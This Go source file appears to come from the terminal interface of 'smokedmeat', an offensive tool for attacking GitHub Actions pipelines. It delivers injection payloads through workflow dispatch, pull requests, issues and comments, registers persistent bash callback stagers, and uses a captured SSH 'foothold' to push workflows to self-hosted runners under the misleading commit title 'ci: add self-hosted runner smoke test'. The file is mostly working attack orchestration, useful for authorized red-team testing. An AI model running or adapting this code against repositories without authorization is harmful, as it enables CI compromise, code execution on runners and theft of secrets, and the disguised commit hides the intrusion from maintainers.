// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/boostsecurityio/smokedmeat/internal/counter"
)

var pushRunnerTargetWorkflowViaSSHFn = pushRunnerTargetWorkflowViaSSH

func generateRunnerTargetBranchName(now time.Time) string {
	return fmt.Sprintf("smokedmeat-runner-%d", now.Unix())
}

func (m Model) deployAutoDispatch(vuln *Vulnerability, stagerID, payload string, token *CollectedSecret, inputName string, dwellTime time.Duration) tea.Cmd {
	return func() tea.Msg {
		if token == nil {
			return AutoDispatchFailedMsg{StagerID: stagerID, Err: fmt.Errorf("no ephemeral token available")}
		}

		parts := strings.SplitN(vuln.Repository, "/", 2)
		if len(parts) != 2 {
			return AutoDispatchFailedMsg{StagerID: stagerID, Err: fmt.Errorf("invalid repository format")}
		}
		owner, repo := parts[0], parts[1]

		workflowFile := strings.TrimPrefix(vuln.Workflow, ".github/workflows/")
		ctx := context.Background()
		var inputs map[string]interface{}
		if inputName != "" {
			inputs = map[string]interface{}{inputName: payload}
		}
		err := m.kitchenClient.TriggerDispatch(ctx, counter.DeployDispatchRequest{
			Token:        token.Value,
			Owner:        owner,
			Repo:         repo,
			WorkflowFile: workflowFile,
			Ref:          "main",
			Inputs:       inputs,
		})
		if err != nil {
			return AutoDispatchFailedMsg{StagerID: stagerID, Err: err}
		}

		return AutoDispatchSuccessMsg{StagerID: stagerID, Vuln: vuln, InputName: inputName, DwellTime: dwellTime}
	}
}

func (m Model) deployAutoPR(vuln *Vulnerability, stagerID, payload string, dwellTime time.Duration, draft, autoClose *bool) tea.Cmd {
	return func() tea.Msg {
		if m.tokenInfo == nil {
			return AutoPRDeploymentFailedMsg{StagerID: stagerID, Err: fmt.Errorf("token not set")}
		}

		resp, err := m.kitchenClient.DeployPR(context.Background(), counter.DeployPRRequest{
			Token:     m.tokenInfo.Value,
			Vuln:      counter.VulnerabilityInfo{Repository: vuln.Repository, Workflow: vuln.Workflow, Context: vuln.Context, ID: vuln.ID},
			Payload:   payload,
			StagerID:  stagerID,
			Draft:     draft,
			AutoClose: autoClose,
		})
		if err != nil {
			return AutoPRDeploymentFailedMsg{StagerID: stagerID, Err: err}
		}

		return AutoPRDeploymentSuccessMsg{StagerID: stagerID, PRURL: resp.PRURL, Vuln: vuln, DwellTime: dwellTime}
	}
}

func (m Model) deployIssue(vuln *Vulnerability, stagerID, payload string, dwellTime time.Duration, autoClose *bool) tea.Cmd {
	return func() tea.Msg {
		if m.tokenInfo == nil {
			return IssueDeploymentFailedMsg{StagerID: stagerID, Err: fmt.Errorf("token not set")}
		}

		resp, err := m.kitchenClient.DeployIssue(context.Background(), counter.DeployIssueRequest{
			Token:       m.tokenInfo.Value,
			Vuln:        counter.VulnerabilityInfo{Repository: vuln.Repository, Workflow: vuln.Workflow, Context: vuln.Context, ID: vuln.ID},
			Payload:     payload,
			CommentMode: isCommentInjection(vuln),
			StagerID:    stagerID,
			AutoClose:   autoClose,
		})
		if err != nil {
			return IssueDeploymentFailedMsg{StagerID: stagerID, Err: err}
		}

		return IssueDeploymentSuccessMsg{StagerID: stagerID, IssueURL: resp.IssueURL, Vuln: vuln, DwellTime: dwellTime}
	}
}

func (m Model) deployComment(vuln *Vulnerability, stagerID, payload string, issueNumber int, dwellTime time.Duration, target CommentTarget, autoClose *bool) tea.Cmd {
	return func() tea.Msg {
		if m.tokenInfo == nil {
			return CommentDeploymentFailedMsg{StagerID: stagerID, Err: fmt.Errorf("token not set")}
		}

		resp, err := m.kitchenClient.DeployComment(context.Background(), counter.DeployCommentRequest{
			Token:     m.tokenInfo.Value,
			Vuln:      counter.VulnerabilityInfo{Repository: vuln.Repository, Workflow: vuln.Workflow, Context: vuln.Context, ID: vuln.ID, IssueNumber: issueNumber},
			Payload:   payload,
			Target:    target.RequestValue(),
			AutoClose: autoClose,
		})
		if err != nil {
			return CommentDeploymentFailedMsg{StagerID: stagerID, Err: err}
		}

		return CommentDeploymentSuccessMsg{StagerID: stagerID, CommentURL: resp.CommentURL, Vuln: vuln, DwellTime: dwellTime}
	}
}

func (m Model) deployLOTP(vuln *Vulnerability, stagerID string, dwellTime time.Duration) tea.Cmd {
	return func() tea.Msg {
		if m.tokenInfo == nil {
			return LOTPDeploymentFailedMsg{StagerID: stagerID, Err: fmt.Errorf("token not set")}
		}

		resp, err := m.kitchenClient.DeployLOTP(context.Background(), counter.DeployLOTPRequest{
			Token:    m.tokenInfo.Value,
			RepoName: vuln.Repository,
			Vuln: counter.VulnerabilityInfo{
				Repository:   vuln.Repository,
				Workflow:     vuln.Workflow,
				Context:      vuln.Context,
				ID:           vuln.ID,
				GateTriggers: vuln.GateTriggers,
				GateRaw:      vuln.GateRaw,
			},
			StagerID:    stagerID,
			LOTPTool:    vuln.LOTPTool,
			LOTPAction:  vuln.LOTPAction,
			LOTPTargets: vuln.LOTPTargets,
			CallbackURL: m.config.ExternalURL(),
		})
		if err != nil {
			return LOTPDeploymentFailedMsg{StagerID: stagerID, Err: err}
		}

		return LOTPDeploymentSuccessMsg{StagerID: stagerID, PRURL: resp.PRURL, Vuln: vuln, DwellTime: dwellTime}
	}
}

func (m Model) deployRunnerTargetAutoWorkflowPush(target *RunnerTargetSelection, stagerID, branchName, workflowPath, workflowYAML string, dwellTime time.Duration, sshState *SSHState) tea.Cmd {
	return func() tea.Msg {
		if sshState != nil {
			pushedBranch, branchURL, err := pushRunnerTargetWorkflowViaSSHFn(sshState, target.Repository, branchName, workflowPath, workflowYAML, "ci: add self-hosted runner smoke test")
			if err != nil {
				return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
			}
			return RunnerTargetWorkflowPushSuccessMsg{
				StagerID:  stagerID,
				Target:    target,
				Branch:    pushedBranch,
				BranchURL: branchURL,
				Route:     "ssh",
				DwellTime: dwellTime,
			}
		}

		if m.tokenInfo == nil {
			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("no token or SSH write foothold is active")}
		}

		resp, err := m.kitchenClient.DeploySelfHostedWorkflowPush(context.Background(), counter.DeploySelfHostedWorkflowPushRequest{
			Token:    m.tokenInfo.Value,
			RepoName: target.Repository,
			Branch:   branchName,
			Path:     workflowPath,
			Content:  workflowYAML,
			Title:    "ci: add self-hosted runner smoke test",
			StagerID: stagerID,
		})
		if err != nil {
			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
		}

		return RunnerTargetWorkflowPushSuccessMsg{
			StagerID:  stagerID,
			Target:    target,
			Branch:    resp.Branch,
			BranchURL: resp.BranchURL,
			Route:     "token",
			DwellTime: dwellTime,
		}
	}
}

func pushRunnerTargetWorkflowViaSSH(ss *SSHState, repo, branchName, workflowPath, workflowYAML, commitMessage string) (branchNameOut, branchURL string, err error) {
	if ss == nil || strings.TrimSpace(ss.KeyValue) == "" {
		return "", "", fmt.Errorf("SSH foothold is not active")
	}

	tmpDir, err := os.MkdirTemp("", "smokedmeat-runner-push-*")
	if err != nil {
		return "", "", fmt.Errorf("failed to create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	sshState := &SSHState{
		KeyValue: ss.KeyValue,
		TempDir:  tmpDir,
	}
	if err := setupSSHShellHome(sshState); err != nil {
		return "", "", fmt.Errorf("failed to prepare SSH home: %w", err)
	}

	if strings.TrimSpace(branchName) == "" {
		branchName = generateRunnerTargetBranchName(time.Now())
	}
	repoDir := filepath.Join(tmpDir, "repo")
	env := append(os.Environ(), sshShellEnv(sshState, sshState.TempDir)...)
	remote := "ssh://git@github.com/" + repo + ".git"

	if err := runGitWithEnv(tmpDir, env, "clone", "--depth=1", remote, repoDir); err != nil {
		return "", "", err
	}
	if err := runGitWithEnv(repoDir, env, "checkout", "-b", branchName); err != nil {
		return "", "", err
	}

	targetPath := filepath.Join(repoDir, filepath.FromSlash(workflowPath))
	if err := os.MkdirAll(filepath.Dir(targetPath), 0o755); err != nil {
		return "", "", fmt.Errorf("failed to create workflow directory: %w", err)
	}
	if err := os.WriteFile(targetPath, []byte(workflowYAML), 0o644); err != nil {
		return "", "", fmt.Errorf("failed to write workflow file: %w", err)
	}

	if err := runGitWithEnv(repoDir, env, "add", workflowPath); err != nil {
		return "", "", err
	}
	if err := runGitWithEnv(repoDir, env, gitCommitArgs(commitMessage)...); err != nil {
		return "", "", err
	}
	if err := runGitWithEnv(repoDir, env, "push", "origin", branchName); err != nil {
		return "", "", err
	}

	branchURL = fmt.Sprintf("https://github.com/%s/tree/%s", repo, branchName)
	return branchName, branchURL, nil
}

func gitCommitArgs(message string) []string {
	return []string{
		"-c", "user.name=SmokedMeat Counter",
		"-c", "user.email=smokedmeat@local.invalid",
		"commit", "-m", message,
	}
}

func runGitWithEnv(dir string, env []string, args ...string) error {
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = env
	output, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(output))
		if msg == "" {
			return fmt.Errorf("git %s failed: %w", strings.Join(args, " "), err)
		}
		return fmt.Errorf("git %s failed: %s", strings.Join(args, " "), msg)
	}
	return nil
}

func maskCommandToken(cmd string) string {
	parts := strings.Fields(cmd)
	if len(parts) >= 3 && parts[0] == "set" && parts[1] == "token" {
		token := parts[2]
		if len(token) > 8 {
			parts[2] = token[:4] + "…" + token[len(token)-4:]
		}
		return strings.Join(parts, " ")
	}
	return cmd
}

func parseDeploymentError(err error) string {
	if err == nil {
		return ""
	}
	errStr := err.Error()

	switch {
	case strings.Contains(errStr, "preflight:"):
		if strings.Contains(errStr, "404") {
			return "Workflow not found. Verify the filename exists in the repository."
		}
		if strings.Contains(errStr, "403") {
			return "Token cannot access repository actions. Needs actions permission."
		}
		return errStr
	case strings.Contains(errStr, "410"):
		return "Issues are disabled on this repository. Use Copy or Comment on existing issue."
	case strings.Contains(errStr, "403"):
		if strings.Contains(errStr, "failed to create branch") || strings.Contains(errStr, "create branch ref") {
			return "GitHub rejected branch creation. Verify effective Contents: write on the target repository."
		}
		if strings.Contains(errStr, "failed to commit .github/workflows/") || strings.Contains(errStr, "/contents/.github/workflows/") {
			return "GitHub rejected the workflow-file write. For App and fine-grained tokens, verify effective Contents: write plus Workflows: write, then refresh the token after any installation permission approval."
		}
		if strings.Contains(errStr, "Resource not accessible") {
			return "Token lacks required repository write permission. Fine-grained PATs and GitHub App installation tokens need effective Contents: write and Pull requests: write. If you just changed GitHub App permissions, approve the installation update and mint a fresh installation token."
		}
		if strings.Contains(errStr, "must have admin") {
			return "Token lacks admin access to this repository."
		}
		if strings.Contains(errStr, "actions") || strings.Contains(errStr, "workflow") {
			return "Token has actions:read but lacks actions:write. Cannot trigger workflow dispatch."
		}
		return "Access denied. Classic token needs 'repo' scope; fine-grained needs specific permissions."
	case strings.Contains(errStr, "404"):
		return "Repository not found or not accessible with this token."
	case strings.Contains(errStr, "422"):
		if strings.Contains(errStr, "Could not resolve to a node with the global id of") {
			return "GitHub was not ready to accept a comment on the new issue yet. Retry in a moment."
		}
		if strings.Contains(errStr, "head sha can't be blank") {
			return "Fork not ready yet. Wait a moment and retry."
		}
		return "Invalid request. The payload may contain forbidden characters."
	case strings.Contains(errStr, "rate limit") || strings.Contains(errStr, "rate_limit"):
		return "GitHub API rate limit hit. Wait a few minutes."
	case strings.Contains(errStr, "token not set"):
		return "No token configured. Set a token first with 'token <value>'."
	default:
		return errStr
	}
}

func (m *Model) registerStager(stagerID string) error {
	_, err := m.registerCallbackWithPayloadAndMeta(stagerID, "", 0, 1, nil, false, "")
	return err
}

func (m *Model) registerStagerForVuln(stagerID string, dwellTime time.Duration, maxCallbacks int, vuln *Vulnerability) error {
	var meta map[string]string
	if vuln != nil {
		meta = map[string]string{
			"repository": vuln.Repository,
			"workflow":   vuln.Workflow,
			"job":        vuln.Job,
		}
	}
	_, err := m.registerCallbackWithPayloadAndMeta(stagerID, "", dwellTime, maxCallbacks, meta, false, "")
	return err
}

func (m *Model) registerStagerWithMeta(stagerID string, dwellTime time.Duration, maxCallbacks int, metadata map[string]string) error {
	_, err := m.registerCallbackWithPayloadAndMeta(stagerID, "", dwellTime, maxCallbacks, metadata, false, "")
	return err
}

func (m *Model) registerPersistentCallback(stagerID, payload string, dwellTime time.Duration, metadata map[string]string) (*counter.CallbackPayload, error) {
	return m.registerCallbackWithPayloadAndMeta(stagerID, payload, dwellTime, 0, metadata, true, "express")
}

func (m *Model) registerPersistentRunnerFoothold(stagerID string, dwellTime time.Duration, metadata map[string]string) (*counter.CallbackPayload, error) {
	return m.registerCallbackWithPayloadAndMeta(stagerID, "", dwellTime, 0, metadata, true, "express")
}

func (m *Model) registerCallbackWithPayloadAndMeta(stagerID, payload string, dwellTime time.Duration, maxCallbacks int, metadata map[string]string, persistent bool, defaultMode string) (*counter.CallbackPayload, error) {
	if m.kitchenClient == nil {
		return nil, fmt.Errorf("not connected to kitchen")
	}
	dwell := ""
	if dwellTime > 0 {
		dwell = dwellTime.String()
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	resp, err := m.kitchenClient.RegisterCallback(ctx, stagerID, counter.RegisterCallbackRequest{
		ResponseType: "bash",
		Payload:      payload,
		SessionID:    m.config.SessionID,
		Metadata:     metadata,
		Persistent:   persistent,
		MaxCallbacks: maxCallbacks,
		DefaultMode:  defaultMode,
		DwellTime:    dwell,
	})
	if err != nil {
		return nil, err
	}
	if resp == nil {
		return nil, nil
	}
	return resp.Callback, nil
}

func isCommentInjection(vuln *Vulnerability) bool {
	for _, src := range vuln.InjectionSources {
		if strings.Contains(src, "comment") {
			return true
		}
	}
	return false
}
